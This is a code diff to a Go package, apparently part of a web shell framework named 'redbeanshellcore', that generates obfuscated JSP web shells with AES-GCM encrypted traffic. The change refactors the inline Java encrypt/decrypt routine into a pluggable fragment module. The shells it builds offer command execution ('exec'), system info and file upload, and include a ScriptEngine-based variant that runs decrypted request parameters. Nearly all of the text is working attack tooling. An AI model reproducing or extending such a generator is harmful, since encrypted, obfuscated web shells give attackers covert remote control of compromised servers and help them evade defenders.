@@ -1,33 +1,10 @@
 package jsp
 
 import (
-	"encoding/base64"
-	"fmt"
 	"strings"
-)
 
-func cryptoMethods(key []byte) string {
-	b64Key := base64.StdEncoding.EncodeToString(key)
-	return fmt.Sprintf(
-		"static final byte[] KEY=java.util.Base64.getDecoder().decode(\"%s\");"+
-			"String dec(String e)throws Exception{"+
-			"byte[] d=java.util.Base64.getDecoder().decode(e);"+
-			"byte[] n=java.util.Arrays.copyOfRange(d,0,12);"+
-			"byte[] c=java.util.Arrays.copyOfRange(d,12,d.length);"+
-			"javax.crypto.Cipher a=javax.crypto.Cipher.getInstance(\"AES/GCM/NoPadding\");"+
-			"a.init(javax.crypto.Cipher.DECRYPT_MODE,new javax.crypto.spec.SecretKeySpec(KEY,\"AES\"),new javax.crypto.spec.GCMParameterSpec(128,n));"+
-			"return new String(a.doFinal(c),\"UTF-8\");}"+
-			"String enc(String s)throws Exception{"+
-			"byte[] n=new byte[12];java.security.SecureRandom.getInstanceStrong().nextBytes(n);"+
-			"javax.crypto.Cipher a=javax.crypto.Cipher.getInstance(\"AES/GCM/NoPadding\");"+
-			"a.init(javax.crypto.Cipher.ENCRYPT_MODE,new javax.crypto.spec.SecretKeySpec(KEY,\"AES\"),new javax.crypto.spec.GCMParameterSpec(128,n));"+
-			"byte[] c=a.doFinal(s.getBytes(\"UTF-8\"));"+
-			"byte[] o=new byte[12+c.length];"+
-			"System.arraycopy(n,0,o,0,12);System.arraycopy(c,0,o,12,c.length);"+
-			"return java.util.Base64.getEncoder().encodeToString(o);}",
-		b64Key,
-	)
-}
+	"github.com/Yliken/redbeanshellcore/crypto/fragment"
+)
 
 func cryptoImport() string {
 	return `<%@page import="javax.crypto.*,javax.crypto.spec.*,java.security.*,java.util.*,java.io.*,java.text.*"%>`
@@ -39,11 +16,30 @@ func pwWrap(code string) string {
 	return strings.ReplaceAll(code, "out.print(", "__pw.print(")
 }
 
+// aesgcmFragment builds an AES-GCM fragment. Invalid key lengths fall back to
+// the raw key so legacy callers that passed arbitrary bytes keep working.
+func aesgcmFragment(key []byte) fragment.Fragment {
+	frag, err := fragment.NewAESGCM(key)
+	if err != nil {
+		return &fragment.AESGCM{Key: key}
+	}
+	return frag
+}
+
+// CryptoShellSource returns the action-level AES-GCM encrypted static shell.
 func CryptoShellSource(key []byte) string {
 	return CryptoShellSourceWith(key, DefaultObfuscator())
 }
 
+// CryptoShellSourceWith returns the action-level AES-GCM encrypted static shell
+// with a custom Obfuscator.
 func CryptoShellSourceWith(key []byte, obf *Obfuscator) string {
+	return CryptoShellSourceWithFragment(aesgcmFragment(key), obf)
+}
+
+// CryptoShellSourceWithFragment injects a CryptoFragment into the
+// action-level encrypted static shell. The fragment owns the dec/enc methods.
+func CryptoShellSourceWithFragment(frag fragment.Fragment, obf *Obfuscator) string {
 	af := obf.ActionField()
 	acInfo := obf.ActionCode("info")
 	acExec := obf.ActionCode("exec")
@@ -61,7 +57,7 @@ func CryptoShellSourceWith(key []byte, obf *Obfuscator) string {
 	upCode := pwWrap(tpl.FileUpload())
 
 	return cryptoImport() + "\n" +
-		`<%!` + cryptoMethods(key) + HelperBase64With(obf) + `%>` + "\n" +
+		`<%!` + frag.DecryptJava() + frag.EncryptJava() + HelperBase64With(obf) + `%>` + "\n" +
 		`<%
 java.io.StringWriter __sw=new java.io.StringWriter();
 java.io.PrintWriter __pw=new java.io.PrintWriter(__sw);
@@ -79,17 +75,26 @@ __pw.flush();out.print(enc(__sw.toString()));
 %>`
 }
 
+// CryptoDynamicShellSource returns the ScriptEngine-based AES-GCM encrypted shell.
 func CryptoDynamicShellSource(key []byte) string {
 	return CryptoDynamicShellSourceWith(key, DefaultObfuscator())
 }
 
+// CryptoDynamicShellSourceWith returns the ScriptEngine-based AES-GCM encrypted
+// shell with a custom Obfuscator.
 func CryptoDynamicShellSourceWith(key []byte, obf *Obfuscator) string {
+	return CryptoDynamicShellSourceWithFragment(aesgcmFragment(key), obf)
+}
+
+// CryptoDynamicShellSourceWithFragment injects a CryptoFragment into the
+// ScriptEngine-based encrypted shell.
+func CryptoDynamicShellSourceWithFragment(frag fragment.Fragment, obf *Obfuscator) string {
 	af := obf.ActionField()
 	p1 := obf.Param1()
 	p2 := obf.Param2()
 
 	return cryptoImport() + "\n" +
-		`<%!` + cryptoMethods(key) + `%>` + "\n" +
+		`<%!` + frag.DecryptJava() + frag.EncryptJava() + `%>` + "\n" +
 		`<%
 try{
 String z0=dec(request.getParameter("` + af + `"));
